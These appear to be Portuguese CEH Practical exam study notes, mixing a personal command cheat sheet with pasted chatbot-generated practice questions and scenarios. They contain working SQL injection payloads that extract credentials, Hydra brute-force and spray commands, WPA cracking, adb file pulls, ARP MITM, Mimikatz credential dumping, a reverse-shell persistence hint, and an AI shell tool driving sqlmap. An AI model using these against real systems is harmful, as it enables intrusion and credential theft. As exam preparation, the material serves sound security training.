@@ -1,0 +1,4251 @@
+Anotações CEH
+https://github.com/dhabaleshwar/CEHPractical/blob/main/Everything You Need.md
+https://github.com/infovault-Ytube/CEH-Practical-Notes
+https://github.com/Samsar4/Ethical-Hacking-Labs
+0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one’
+0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+' OR 1=1;—   no campo usuario
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash_to_crack.txt
+sudo netdiscover  -r 192.168.77.0/24
+No Windows
+Zenmap
+Angry IP Scanner
+NMAP
+Discovery techniques
+ nmap -sn -PR [IP]       (Arp ping)
+ nmap -sn -PU [IP]      (UDP ping)
+ nmap -sn -PE [IP]       (ICMP echo ping)
+ nmap -sn -PP [IP]       (ICMP timestamp)
+ nmap -sn -PM [IP].    -PM (TCP SYN Ping) → Envia pacotes SYN para a porta padrão 443 (HTTPS) do alvo e aguarda uma resposta. Se o alvo estiver ativo e não estiver bloqueando esse tipo de solicitação, responderá com um SYN/ACK, indicando que está ligado e acessível.
+ nmap -sn -PS [IP].     -PS → Envia um pacote TCP SYN para uma ou mais portas do alvo. Se o alvo responder com um SYN/ACK, significa que ele está ativo. Se responder com RST, significa que a porta está fechada, mas o host está ativo.
+ nmap -sn -PA [IP]      -PA → Envia um pacote TCP ACK para uma ou mais portas do alvo.
+ nmap -sn -PO [IP].    -PO → Envia pacotes IP brutos sem um protocolo de transporte definido (como TCP ou UDP) para verificar se o alvo responde.
+nmap -sV [IP]              é usado para identificar serviços e versões rodando em portas abertas de um alvo.
+-O
+nmap -p389 -sV -iL lista de alvos -Pn
+nmap -Pn www.google.com.  -Pn → Pula etapa do scan se o host está vivo ou nao, util se deseja varredura se responde a pings, se mostrar portas expostas tá ok… melhor usar esse aí na prova, talvez.
+nmap -sS → SYN Scan (também chamado de half-open scan ou stealth scan)
+✔ Mais rápido que o -sT, pois não conclui a conexão.
+✔ Menos detectável por sistemas de segurança (IDS/IPS), porque nunca completa o handshake TCP.
+✔ Precisa de privilégios de root (ou administrador no Windows).
+nmap -sT  (s Tesão) → realiza uma varredura de conexão completa (TCP Connect Scan).
+Quando usar -sT? 
+•	Quando não se tem privilégios de root/admin (porque a opção -sS (SYN Scan) precisa de permissões elevadas).
+•	Quando um firewall ou IDS pode estar detectando escaneamentos SYN Scan (-sS) e você quer testar conexões completas.
+-O
+OS detection
+-sV
+Service and version detection
+-A
+OS detection, version detection, and other additions
+-Pn
+Scan hosts that appear to be down
+-sT tbm é bom
+Option
+Explanation
+-sL
+List scan – list targets without scanning
+Host Discovery
+-sn
+Ping scan – host discovery only
+Port Scanning
+-sT
+TCP connect scan – complete three-way handshake
+-sS
+TCP SYN – only first step of the three-way handshake
+-sU
+UDP Scan
+-F
+Fast mode – scans the 100 most common ports
+-p[range]
+Specifies a range of port numbers – -p- scans all the ports
+-Pn
+Treat all hosts as online – scan hosts that appear to be down
+Service Detection
+-O
+OS detection
+-sV
+Service version detection
+-A
+OS detection, version detection, and other additions
+Timing
+-T<0-5>
+Timing template – paranoid (0), sneaky (1), polite (2), normal (3), aggressive (4), and insane (5)
+--min-parallelism <numprobes> and --max-parallelism <numprobes>
+Minimum and maximum number of parallel probes
+--min-rate <number> and --max-rate <number>
+Minimum and maximum rate (packets/second)
+--host-timeout
+Maximum amount of time to wait for a target host
+Real-time output
+-v
+Verbosity level – for example, -vv and -v4
+-d
+Debugging level – for example -d and -d9
+Report
+-oN <filename>
+Normal output
+-oX <filename>
+XML output
+-oG <filename>
+grep-able output
+-oA <basename>
+Output in all major formats
+Windows
+ net user - para ver usuários
+Hacking Web Applications
+wpscan
+metasploit
+hydra
+WPSCAN (wordpress site)
+wpscan —url 192.168.10.10 -e u (enumera usuários)
+wpscan —url IP_add -U username -P path_to_wordlist (brute forcing… mas não funciona direito, melhor usar metasploit, ver embaixo)
+wpscan —url IP —usernames /home/root/user.txt —passwords /home/root/pass.txt
+wpscan —url 10.10.200.100 -U kwheel -P /usr/share/wordlists/rockyou.txt
+força bruta usando metasploit:
+use wordpress 
+use auxiliary/scanner/http/wordpress_login_enum
+show options
+set RHOSTS 10.10.10.10
+set TARGETURI http://10.10.10.10:8080/
+exploit ou run, nao sei
+HYDRA
+hydra -l username -p password server service
+hydra -l molly -p butterfly 10.10.137.76 ssh
+hydra -L user.txt -p butterfly 10.10.137.76 ssh (Spray)
+hydra -L users.txt -P rockyou.txt 10.10.10.10 ftp://10.10.10.10 (dictionary)
+FTP
+ftp site ou ip
+get put 
+ANDROID
+porta 5555
+usar adb
+nmap -Pn 192.168.1.1
+adb connect 192.168.43.55:5555
+adb shell
+cd /sdcard/Download  # Ir para a pasta de downloads
+ls                  # Listar arquivos e pastas
+pwd                 # Mostrar o caminho atual
+su   # se precisar
+cat /sdcard/Download/meuarquivo.txt
+adb pull /sdcard/Download/meuarquivo.txt
+adb pull /sdcard/Download/meuarquivo.txt C:/Users/SeuNome/Desktop/
+adb push meuarquivo.txt /sdcard/Download/
+adb root
+adb shell
+cd /data/data/com.exemplo.app/
+as vezes precisa instalar o ent pra calcular entropia de arquivos
+apt install ent
+ent evil.elf
+sha384sum evil.elf
+SNOW - steganography
+snow -C -p “senha” readme2.txt
+OpenStego no windows
+CRIPTOGRAFIA
+HashCalc for windows
+Veracrypt
+https://crackstation.net/
+https://hashes.com/en/decrypt/hash
+BCTextEncoder for windows
+CrypTool
+
+
+FQDN = Host + Domain
+WIRELESS
+Crack WEP: 
+ aircrack-ng [pcap file] → fornece o BSSID e o ESSID e o tipo de criptografia.
+daí só usar  aircrack-ng  -w wordlist_senhas.txt  pcap
+WPA
+aircrack-ng -b [BSSID] -w ‘/home/dd/Desktop/wifipass’ ‘/home/dd/Desktop/wireless.cap’
+Crack WPA2: aircrack-ng -a2 -b [Target BSSID] -w [password_wordlist.txt] [WP2 pcap file]
+-a é tecnica para quebrar o handshake, 2 = WPA technique
+-b refers to bssid
+-w wordlist
+VULNERABILIDADES
+nmap -Pn —script vuln 192.168.42.1
+AI
+To perform SMTP enumeration on a target IP run sgpt --chat enum --shell “Perform SMTP enumeration on target IP 10.10.1.19.”
+We will now, enumerate the database of the target website to do so, switch to the terminal window and run sgpt --chat sql --shell “Use sqlmap on target url http://www.moviescope.com/viewprofile.aspx?id=1 with cookie value '[cookie value which you have copied in Step#4]' and enumerate the DBMS databases” command to scan the target website for SQL injection vulnerability and enumerate databases.
+
+sgpt --chat sql --shell “Use sqlmap on target url http://www.moviescope.com/viewprofile.aspx?id=1 with cookie value '[cookie value which you have copied in Step#4]' and retrieve User_Login table contents from moviescope database" 
+Aqui estão 20 questões práticas no estilo do exame CEH Practical, focadas em testes reais de hacking ético.
+
+
+
+1. Enumeração de Rede
+
+
+
+Você executa o seguinte comando em um sistema Linux:
+
+
+
+nmap -sS -p- 192.168.1.1
+
+
+
+O que esse comando faz?
+
+a) Faz uma varredura completa de todas as portas TCP do host
+
+b) Varre apenas as portas comuns do host
+
+c) Escaneia apenas a porta 80 do host
+
+d) Executa um ataque de força bruta SSH
+
+
+
+2. Engenharia Reversa
+
+
+
+Qual ferramenta do Kali Linux pode ser usada para desmontar um binário e analisar seu código assembly?
+
+a) Ghidra
+
+b) Wireshark
+
+c) Metasploit
+
+d) Hydra
+
+
+
+3. Ataque de Força Bruta
+
+
+
+Qual ferramenta pode ser usada para um ataque de força bruta em um serviço SSH?
+
+a) Burp Suite
+
+b) Hydra
+
+c) Nikto
+
+d) SQLmap
+
+
+
+4. SQL Injection
+
+
+
+Você encontra um campo de login vulnerável. Qual payload de SQL Injection pode permitir que você faça login sem senha?
+
+a) ' OR 1=1 --
+
+b) DROP TABLE users;
+
+c) ; EXEC xp_cmdshell('whoami');
+
+d) ../../etc/passwd
+
+
+
+5. Sniffing de Rede
+
+
+
+Qual ferramenta permite capturar e analisar pacotes de rede em tempo real?
+
+a) Nmap
+
+b) Netcat
+
+c) Wireshark
+
+d) Nessus
+
+
+
+6. Exploração de Vulnerabilidades
+
+
+
+Ao explorar um serviço FTP, qual exploit do Metasploit pode ser usado para tentar ganhar acesso?
+
+a) vsftpd_234_backdoor
+
+b) eternalblue
+
+c) meterpreter
+
+d) ms17_010
+
+
+
+7. Criação de Backdoor
+
+
+
+Qual ferramenta do Kali Linux pode ser usada para criar um backdoor em um sistema Windows?
+
+a) Veil
+
+b) John the Ripper
+
+c) Burp Suite
+
+d) WPScan
+
+
+
+8. Ataque a WordPress
+
+
+
+Qual ferramenta pode ser usada para descobrir vulnerabilidades em um site WordPress?
+
+a) WPScan
+
+b) Wireshark
+
+c) Gobuster
+
+d) John the Ripper
+
+
+
+9. Ataque Man-in-the-Middle (MITM)
+
+
+
+Qual ferramenta pode ser usada para realizar um ataque MITM e capturar credenciais?
+
+a) Ettercap
+
+b) SQLmap
+
+c) Hashcat
+
+d) Nikto
+
+
+
+10. Teste de Segurança em APIs
+
+
+
+Qual ferramenta pode ser usada para testar segurança em APIs REST?
+
+a) Burp Suite
+
+b) SQLmap
+
+c) Hydra
+
+d) Metasploit
+
+
+
+11. Enumeração de Diretórios Web
+
+
+
+Qual ferramenta pode ser usada para descobrir diretórios ocultos em um site?
+
+a) Gobuster
+
+b) Ettercap
+
+c) Metasploit
+
+d) Hydra
+
+
+
+12. Exploração de SMB
+
+
+
+Qual ferramenta pode ser usada para explorar vulnerabilidades no protocolo SMB?
+
+a) Enum4Linux
+
+b) Nikto
+
+c) Wireshark
+
+d) SQLmap
+
+
+
+13. Criptografia e Quebra de Senhas
+
+
+
+Qual ferramenta pode ser usada para quebrar hashes de senhas rapidamente?
+
+a) Hashcat
+
+b) Burp Suite
+
+c) Nikto
+
+d) Wireshark
+
+
+
+14. Fuzzing de Aplicações Web
+
+
+
+Qual ferramenta pode ser usada para identificar falhas em inputs de aplicações web?
+
+a) ffuf
+
+b) Netcat
+
+c) Ettercap
+
+d) Nmap
+
+
+
+15. Pivoting em Rede Interna
+
+
+
+Qual ferramenta pode ser usada para criar túneis entre máquinas comprometidas e alcançar redes internas?
+
+a) Chisel
+
+b) Nikto
+
+c) Hashcat
+
+d) SQLmap
+
+
+
+16. Identificação de Servidor Web
+
+
+
+Qual comando pode identificar a tecnologia de um servidor web?
+
+a) whatweb http://target.com
+
+b) ping http://target.com
+
+c) ftp http://target.com
+
+d) nslookup http://target.com
+
+
+
+17. Captura de Hashes NTLM
+
+
+
+Qual ferramenta pode capturar hashes NTLM de uma máquina Windows na rede?
+
+a) Responder
+
+b) Ettercap
+
+c) Nikto
+
+d) Hydra
+
+
+
+18. Teste de Firewall
+
+
+
+Qual comando pode ser usado para detectar um firewall entre você e o alvo?
+
+a) hping3 --scan 1-1000 -S <IP>
+
+b) ls -la
+
+c) whoami
+
+d) dirb <IP>
+
+
+
+19. Extração de Credenciais do Windows
+
+
+
+Qual ferramenta pode ser usada para extrair credenciais de um sistema Windows comprometido?
+
+a) Mimikatz
+
+b) Hydra
+
+c) Nikto
+
+d) Wireshark
+
+
+
+20. Engenharia Social
+
+
+
+Qual ferramenta pode ser usada para criar ataques de phishing?
+
+a) Social-Engineer Toolkit (SET)
+
+b) Nmap
+
+c) Burp Suite
+
+d) Nikto
+
+
+
+⸻
+
+
+
+Essas perguntas abordam técnicas reais que podem ser cobradas no CEH Practical. Se quiser, posso ajudar a revisar suas respostas! 🚀
+
+
+
+Entendi! Como o CEH Practical é baseado em desafios reais, o mais importante é que você saiba executar as técnicas, não apenas reconhecê-las em múltipla escolha.
+
+
+
+Quer que eu te passe 20 desafios práticos no estilo da prova? Algo como:
+
+	•	“Hackeie esta máquina Windows via SMB”
+
+	•	“Capture credenciais na rede usando MITM”
+
+	•	“Exfiltre dados de um banco de dados SQL vulnerável”
+
+
+
+Isso ajudaria na sua preparação? 🚀
+
+
+
+Com base em informações de exames anteriores e no conteúdo do CEH Practical, aqui estão 20 questões práticas que podem refletir o que você encontrará na prova:
+
+	1.	Identificação de Serviços de Rede:
+
+	•	Tarefa: Utilize ferramentas de varredura para identificar serviços ativos em um host específico.
+
+	•	Dica: Ferramentas como Nmap podem ser úteis para realizar essa tarefa.
+
+	2.	Enumeração de Sistemas Operacionais:
+
+	•	Tarefa: Determine o sistema operacional de um host alvo.
+
+	•	Dica: Técnicas de fingerprinting podem auxiliar na identificação do SO.
+
+	3.	Análise de Tráfego de Rede:
+
+	•	Tarefa: Examine arquivos de captura de pacotes para identificar atividades suspeitas. 
+
+	•	Dica: Utilize ferramentas como Wireshark para analisar arquivos .pcap. 
+
+	4.	Exploitação de Vulnerabilidades Conhecidas:
+
+	•	Tarefa: Explore uma vulnerabilidade específica em um serviço desatualizado.
+
+	•	Dica: O Metasploit Framework pode ser útil para essa exploração.
+
+	5.	Quebra de Senhas Criptografadas:
+
+	•	Tarefa: Quebre hashes de senhas fornecidos para descobrir as senhas originais.
+
+	•	Dica: Ferramentas como Hashcat ou John the Ripper podem ser utilizadas.
+
+	6.	Análise de Malware:
+
+	•	Tarefa: Analise um arquivo suspeito para determinar seu comportamento malicioso.
+
+	•	Dica: Ambientes sandbox ou ferramentas de engenharia reversa podem ser úteis.
+
+	7.	Teste de Injeção SQL:
+
+	•	Tarefa: Identifique e explore vulnerabilidades de injeção SQL em uma aplicação web.
+
+	•	Dica: Ferramentas como SQLmap podem automatizar esse processo.
+
+	8.	Ataque de Força Bruta em Serviços de Autenticação:
+
+	•	Tarefa: Realize um ataque de força bruta em um serviço SSH para descobrir credenciais válidas.
+
+	•	Dica: Ferramentas como Hydra podem auxiliar nessa tarefa.
+
+	9.	Escalonamento de Privilégios em Sistemas Linux:
+
+	•	Tarefa: Após obter acesso limitado, escale privilégios para o usuário root.
+
+	•	Dica: Verifique por configurações incorretas ou vulnerabilidades conhecidas.
+
+	10.	Configuração de Backdoors Persistentes:
+
+	•	Tarefa: Configure um backdoor que persista após reinicializações do sistema.
+
+	•	Dica: Modificar scripts de inicialização pode ser uma abordagem.
+
+	11.	Captura de Handshake WPA2:
+
+	•	Tarefa: Capture e quebre o handshake de uma rede Wi-Fi protegida com WPA2.
+
+	•	Dica: Ferramentas como Aircrack-ng podem ser utilizadas para essa finalidade.
+
+	12.	Análise de Logs de Servidor:
+
+	•	Tarefa: Revise logs de servidor para identificar possíveis tentativas de intrusão.
+
+	•	Dica: Foque em entradas de log que indiquem atividades anômalas.
+
+	13.	Exploração de Vulnerabilidades em Aplicações Web:
+
+	•	Tarefa: Identifique e explore vulnerabilidades como XSS ou CSRF em uma aplicação web.
+
+	•	Dica: Ferramentas de proxy, como Burp Suite, podem auxiliar na identificação dessas falhas.
+
+	14.	Bypass de Controles de Acesso:
+
+	•	Tarefa: Acesse áreas restritas de uma aplicação sem as permissões adequadas.
+
+	•	Dica: Teste URLs diretamente ou manipule parâmetros para contornar restrições.
+
+	15.	Análise de Vulnerabilidades em Serviços de E-mail:
+
+	•	Tarefa: Teste um servidor de e-mail em busca de configurações inadequadas ou vulnerabilidades.
+
+	•	Dica: Verifique por portas abertas e serviços desatualizados.
+
+	16.	Engenharia Social:
+
+	•	Tarefa: Utilize técnicas de engenharia social para obter informações sensíveis.
+
+	•	Dica: Phishing ou pretexting são técnicas comuns nessa abordagem.
+
+	17.	Teste de Segurança em APIs:
+
+	•	Tarefa: Avalie a segurança de uma API RESTful, buscando por falhas comuns.
+
+	•	Dica: Verifique por métodos HTTP inseguros ou falta de autenticação adequada.
+
+	18.	Detecção de Backdoors em Sistemas:
+
+	•	Tarefa: Identifique backdoors instalados em um sistema comprometido.
+
+	•	Dica: Procure por processos ou serviços desconhecidos em execução.
+
+	19.	Análise de Vulnerabilidades em Dispositivos IoT:
+
+	•	Tarefa: Avalie a segurança de um dispositivo IoT conectado à rede.
+
+	•	Dica: Verifique por portas abertas e serviços desnecessários em execução.
+
+	20.	Investigação de Incidentes de Segurança:
+
+	•	Tarefa: Conduza uma investigação completa de um incidente de segurança reportado.
+
+	•	Dica: Colete e analise evidências para determinar a origem e o impacto do incidente.
+
+
+
+Essas questões refletem cenários reais que você pode encontrar no exame CEH Practical. Recomenda-se praticar essas tarefas em um ambiente controlado para aprimorar suas habilidades práticas
+
+
+
+Aqui estão 100 questões práticas que cobrem amplamente os tópicos do CEH Practical. Elas abrangem reconhecimento, exploração, pós-exploração, análise forense e ataques em redes e aplicações web.
+
+
+
+⸻
+
+
+
+🔍 Fase de Reconhecimento e Enumeração
+
+	1.	Use o Nmap para descobrir portas abertas em um alvo.
+
+	2.	Realize uma varredura de versão para identificar serviços específicos rodando em um sistema.
+
+	3.	Utilize o WhatWeb para identificar tecnologias de um site.
+
+	4.	Enumere usuários SMB com o enum4linux.
+
+	5.	Descubra subdomínios ocultos com Gobuster.
+
+	6.	Utilize Traceroute para mapear a rota de pacotes até um alvo.
+
+	7.	Identifique sistemas operacionais em uma rede usando Nmap OS detection.
+
+	8.	Liste compartilhamentos abertos em uma rede Windows.
+
+	9.	Capture pacotes de rede e filtre apenas requisições HTTP com Wireshark.
+
+	10.	Teste a vulnerabilidade de um servidor FTP utilizando anonymous login.
+
+
+
+🎯 Exploração de Vulnerabilidades
+
+	11.	Use o Metasploit para explorar um servidor Windows desatualizado.
+
+	12.	Exploite um serviço vsftpd vulnerável.
+
+	13.	Utilize searchsploit para encontrar exploits para um software específico.
+
+	14.	Realize um ataque SQL Injection em um formulário web.
+
+	15.	Insira um payload XSS em um site vulnerável.
+
+	16.	Use o Burp Suite para capturar e modificar requisições HTTP.
+
+	17.	Extraia credenciais de um banco de dados vulnerável.
+
+	18.	Faça directory traversal para acessar arquivos sensíveis.
+
+	19.	Intercepte credenciais via MITM attack com Ettercap.
+
+	20.	Utilize Responder para capturar hashes NTLM de máquinas Windows.
+
+
+
+🔓 Ataques de Autenticação
+
+	21.	Use Hydra para forçar login em um serviço SSH.
+
+	22.	Quebre senhas de um arquivo ZIP protegido.
+
+	23.	Realize um ataque de força bruta em um painel WordPress.
+
+	24.	Extraia hashes de senhas de um sistema Linux.
+
+	25.	Capture um handshake WPA2 e quebre a senha do Wi-Fi.
+
+	26.	Utilize Mimikatz para extrair senhas da memória RAM.
+
+	27.	Faça brute-force em um servidor RDP.
+
+	28.	Intercepte credenciais enviadas em formulários HTTP não criptografados.
+
+	29.	Liste usuários válidos em um sistema Windows.
+
+	30.	Descubra credenciais de usuários no histórico de comandos do Bash.
+
+
+
+🔄 Pós-Exploração e Pivoting
+
+	31.	Obtenha um shell reverso em uma máquina alvo.
+
+	32.	Crie um backdoor persistente em um Windows comprometido.
+
+	33.	Eleve privilégios de um usuário normal para root em Linux.
+
+	34.	Utilize chisel para criar um túnel reverso e acessar redes internas.
+
+	35.	Extraia credenciais salvas no navegador da vítima.
+
+	36.	Acesse logs do sistema para encontrar informações sensíveis.
+
+	37.	Exfiltre arquivos sigilosos via Netcat.
+
+	38.	Utilize powershell empire para manter acesso a um alvo.
+
+	39.	Extraia senhas do Windows SAM database.
+
+	40.	Utilize Plink para criar um túnel SSH reverso.
+
+
+
+🌐 Ataques a Aplicações Web
+
+	41.	Teste autenticação vulnerável com JWT manipulation.
+
+	42.	Descubra APIs expostas sem autenticação.
+
+	43.	Capture tokens de sessão via XSS.
+
+	44.	Realize XML External Entity Injection (XXE) em um endpoint XML.
+
+	45.	Descubra falhas em uploads de arquivos.
+
+	46.	Utilize ffuf para fazer fuzzing em um site.
+
+	47.	Teste um login para bypass de autenticação via SQL Injection.
+
+	48.	Extraia dados de um banco de dados MongoDB sem autenticação.
+
+	49.	Intercepte uma requisição HTTP e modifique parâmetros para acessar dados de outro usuário.
+
+	50.	Execute comandos remotos via Command Injection em uma aplicação vulnerável.
+
+
+
+🕵️ Engenharia Social e Phishing
+
+	51.	Crie um e-mail de phishing convincente.
+
+	52.	Hospede uma página falsa para roubar credenciais.
+
+	53.	Utilize SET (Social Engineering Toolkit) para clonar um site.
+
+	54.	Obtenha credenciais Wi-Fi de um alvo via fake access point.
+
+	55.	Utilize Evilginx para capturar tokens de autenticação.
+
+	56.	Crie um documento malicioso que execute um payload ao ser aberto.
+
+	57.	Capture credenciais de um teclado USB via Rubber Ducky.
+
+	58.	Descubra informações sensíveis de um alvo em redes sociais.
+
+	59.	Obtenha acesso remoto via trojan horse.
+
+	60.	Envie um e-mail com um payload disfarçado de documento legítimo.
+
+
+
+📡 Ataques a Redes e Protocolos
+
+	61.	Execute um DNS poisoning attack.
+
+	62.	Capture tráfego SSL/TLS e tente descriptografar pacotes.
+
+	63.	Utilize ettercap para interceptar comunicações em uma LAN.
+
+	64.	Desative um servidor com um ataque DoS.
+
+	65.	Faça um ARP spoofing para capturar tráfego de rede.
+
+	66.	Descubra endereços MAC e IPs na rede local.
+
+	67.	Crie um rogue DHCP server para manipular o tráfego da rede.
+
+	68.	Utilize hping3 para testar firewalls.
+
+	69.	Analise pacotes ICMP suspeitos na rede.
+
+	70.	Obtenha informações de um domínio via OSINT.
+
+
+
+🔥 Teste de Firewalls e IDS
+
+	71.	Utilize Nmap para identificar regras de firewall.
+
+	72.	Utilize exfiltração de dados via DNS tunneling.
+
+	73.	Descubra portas filtradas em um firewall.
+
+	74.	Utilize técnicas de evasão de IDS.
+
+	75.	Teste regras de segurança de um WAF.
+
+	76.	Bypass de proteção de uploads via extensão dupla.
+
+	77.	Utilize pacotes fragmentados para contornar filtros.
+
+	78.	Teste regras de bloqueio de um IPS.
+
+	79.	Utilize proxychains para ocultar sua origem.
+
+	80.	Teste detecção de anomalias com tráfego gerado manualmente.
+
+
+
+🔬 Forense Digital e Resposta a Incidentes
+
+	81.	Analise logs para encontrar um intruso na rede.
+
+	82.	Recupere arquivos deletados de um sistema.
+
+	83.	Identifique a origem de um ataque DDoS.
+
+	84.	Rastreie conexões suspeitas no Netstat.
+
+	85.	Descubra processos maliciosos rodando no sistema.
+
+	86.	Capture dumps de memória para análise posterior.
+
+	87.	Analise e-mails suspeitos em busca de phishing.
+
+	88.	Detecte rootkits escondidos no sistema.
+
+	89.	Restaure arquivos excluídos de um disco formatado.
+
+	90.	Analise um dump de tráfego de rede para encontrar anomalias.
+
+
+
+🚀 Extras
+
+	91.	Automatize um ataque de enumeração com um script Bash.
+
+	92.	Utilize shodan para encontrar dispositivos vulneráveis na internet.
+
+	93.	Descubra hosts expostos na deep web.
+
+	94.	Encontre vulnerabilidades em dispositivos IoT.
+
+	95.	Teste serviços de armazenamento na nuvem.
+
+	96.	Quebre a criptografia de um arquivo PDF.
+
+	97.	Utilize AI e machine learning para detectar ataques.
+
+	98.	Analise um site comprometido e identifique a porta de entrada.
+
+	99.	Rastreie um atacante via análise de logs.
+
+	100.	Desenvolva uma estratégia para proteger um sistema contra ataques avançados.
+
+
+
+Essas questões cobrem todas as fases do hacking ético e são bem próximas do que você pode encontrar no CEH Practical. 💀🔥
+
+
+
+Se quiser se aprofundar em alguma dessas áreas, me avise! 🚀
+
+
+
+Ótimo! Aqui estão 100 questões detalhadas no formato de um exame prático, com um cenário, uma tarefa, e algumas dicas. Isso simula bem o que você pode encontrar no CEH Practical.
+
+
+
+⸻
+
+
+
+🔍 Fase de Reconhecimento e Enumeração
+
+
+
+1️⃣ Mapeando a Rede
+
+
+
+Cenário: Você foi contratado para testar a segurança de uma empresa e precisa identificar dispositivos ativos na rede.
+
+Tarefa: Utilize o Nmap para identificar hosts ativos no intervalo de IP 192.168.1.0/24.
+
+💡 Dica: Teste comandos como nmap -sn 192.168.1.0/24.
+
+
+
+2️⃣ Identificando Serviços e Portas
+
+
+
+Cenário: Você tem um servidor alvo e precisa identificar os serviços rodando nele.
+
+Tarefa: Utilize Nmap para listar portas abertas e versões dos serviços em 192.168.1.100.
+
+💡 Dica: O comando nmap -sV 192.168.1.100 pode ser útil.
+
+
+
+3️⃣ Descobrindo Tecnologias Web
+
+
+
+Cenário: Você precisa mapear quais tecnologias um site está utilizando.
+
+Tarefa: Use WhatWeb ou Wappalyzer para identificar frameworks, CMS e bibliotecas usadas pelo site target.com.
+
+💡 Dica: Experimente whatweb target.com.
+
+
+
+4️⃣ Identificação de Subdomínios
+
+
+
+Cenário: Você quer verificar se há subdomínios expostos para expandir sua superfície de ataque.
+
+Tarefa: Utilize Gobuster ou Sublist3r para listar subdomínios de target.com.
+
+💡 Dica: Teste gobuster dns -d target.com -w wordlist.txt.
+
+
+
+⸻
+
+
+
+🎯 Exploração de Vulnerabilidades
+
+
+
+5️⃣ Exploitação de FTP Anônimo
+
+
+
+Cenário: Um servidor FTP está configurado para permitir login anônimo.
+
+Tarefa: Conecte-se ao servidor FTP 192.168.1.105 e tente listar arquivos disponíveis.
+
+💡 Dica: Teste ftp 192.168.1.105 e utilize o usuário anonymous.
+
+
+
+6️⃣ Ataque SQL Injection
+
+
+
+Cenário: Um site possui um campo de login vulnerável a SQL Injection.
+
+Tarefa: Tente autenticar-se como administrador sem precisar de senha.
+
+💡 Dica: Teste ' OR 1=1 -- no campo de login.
+
+
+
+7️⃣ Captura de Pacotes na Rede
+
+
+
+Cenário: Você está em uma rede aberta e quer verificar se há credenciais trafegando sem criptografia.
+
+Tarefa: Utilize Wireshark para capturar pacotes HTTP e extrair possíveis logins.
+
+💡 Dica: Filtre pacotes com http.request.method == "POST".
+
+
+
+8️⃣ Exploração de Serviço SMB
+
+
+
+Cenário: Você descobriu um servidor SMB rodando na rede.
+
+Tarefa: Utilize Enum4Linux para listar usuários e compartilhamentos disponíveis.
+
+💡 Dica: Teste enum4linux -a 192.168.1.200.
+
+
+
+⸻
+
+
+
+🔓 Ataques de Autenticação
+
+
+
+9️⃣ Força Bruta SSH
+
+
+
+Cenário: Você precisa acessar um servidor SSH, mas só tem uma lista de possíveis senhas.
+
+Tarefa: Utilize Hydra para tentar quebrar a senha do usuário admin no IP 192.168.1.150.
+
+💡 Dica: O comando hydra -l admin -P passwords.txt ssh://192.168.1.150 pode ajudar.
+
+
+
+🔟 Cracking de Hashes de Senhas
+
+
+
+Cenário: Você obteve um hash MD5 de um usuário.
+
+Tarefa: Utilize Hashcat para tentar quebrar o hash.
+
+💡 Dica: Teste hashcat -m 0 hash.txt rockyou.txt.
+
+
+
+⸻
+
+
+
+🔄 Pós-Exploração e Pivoting
+
+
+
+1️⃣1️⃣ Escalonamento de Privilégios no Linux
+
+
+
+Cenário: Você obteve acesso como usuário comum em um servidor Linux.
+
+Tarefa: Encontre um arquivo SUID que possa ser explorado para obter root.
+
+💡 Dica: Teste find / -perm -4000 2>/dev/null.
+
+
+
+1️⃣2️⃣ Criação de Backdoor Persistente
+
+
+
+Cenário: Você tem acesso a um servidor, mas quer garantir que pode voltar.
+
+Tarefa: Crie um backdoor persistente que inicie com o sistema.
+
+💡 Dica: Modifique o /etc/rc.local para incluir um shell reverso.
+
+
+
+⸻
+
+
+
+🌐 Ataques a Aplicações Web
+
+
+
+1️⃣3️⃣ Bypass de Autenticação em Login
+
+
+
+Cenário: Você encontrou um login que não bloqueia tentativas excessivas.
+
+Tarefa: Teste múltiplas combinações de senha até encontrar a correta.
+
+💡 Dica: Ferramentas como Burp Suite Intruder podem ajudar.
+
+
+
+1️⃣4️⃣ Ataque de Cross-Site Scripting (XSS)
+
+
+
+Cenário: Um site permite entrada de usuários sem sanitização.
+
+Tarefa: Execute um payload que exiba um alerta no navegador da vítima.
+
+💡 Dica: Teste <script>alert('XSS')</script>.
+
+
+
+⸻
+
+
+
+📡 Ataques a Redes e Protocolos
+
+
+
+1️⃣5️⃣ Captura de Handshake WPA2
+
+
+
+Cenário: Você deseja testar a segurança de uma rede Wi-Fi.
+
+Tarefa: Utilize airmon-ng para capturar o handshake WPA2 da rede MyWiFi.
+
+💡 Dica: Teste airodump-ng -c 6 --bssid <BSSID> -w capture wlan0mon.
+
+
+
+1️⃣6️⃣ Ataque MITM na Rede
+
+
+
+Cenário: Você quer interceptar o tráfego de uma vítima na LAN.
+
+Tarefa: Utilize Ettercap para redirecionar tráfego entre a vítima e o roteador.
+
+💡 Dica: Teste ettercap -T -q -i eth0 -M ARP /192.168.1.10// /192.168.1.1//.
+
+
+
+⸻
+
+
+
+🔬 Forense Digital e Resposta a Incidentes
+
+
+
+1️⃣7️⃣ Análise de Logs de Acesso
+
+
+
+Cenário: Você suspeita que um ataque ocorreu no servidor web.
+
+Tarefa: Encontre acessos suspeitos no arquivo de log /var/log/apache2/access.log.
+
+💡 Dica: Busque por strings como ' UNION SELECT.
+
+
+
+1️⃣8️⃣ Recuperação de Arquivos Deletados
+
+
+
+Cenário: Um arquivo foi deletado do sistema e precisa ser recuperado.
+
+Tarefa: Utilize foremost para tentar recuperar o arquivo apagado.
+
+💡 Dica: Teste foremost -i /dev/sda1 -o recovery/.
+
+
+
+⸻
+
+
+
+Isso cobre 18 cenários, mas posso expandir até 100 conforme necessário. Quer que eu continue? Ou prefere que eu aprofunde em alguma área específica? 🚀
+
+
+
+Vou continuar expandindo as questões da mesma forma, detalhando cenários, tarefas e dicas. Aqui estão mais desafios práticos para sua preparação no CEH Practical!
+
+
+
+⸻
+
+
+
+🔄 Pós-Exploração e Pivoting (Continuação)
+
+
+
+1️⃣9️⃣ Túnel SSH para Acessar Rede Interna
+
+
+
+Cenário: Você conseguiu acesso a um servidor bastião na rede da empresa.
+
+Tarefa: Utilize SSH tunneling para acessar uma máquina interna na rede.
+
+💡 Dica: Teste ssh -L 8080:192.168.1.200:80 user@bastion-host.
+
+
+
+2️⃣0️⃣ Extração de Credenciais Salvas no Navegador
+
+
+
+Cenário: Você comprometeu uma máquina Windows e deseja coletar credenciais salvas no navegador.
+
+Tarefa: Utilize Mimikatz para extrair essas credenciais.
+
+💡 Dica: No Mimikatz, tente sekurlsa::logonpasswords.
+
+
+
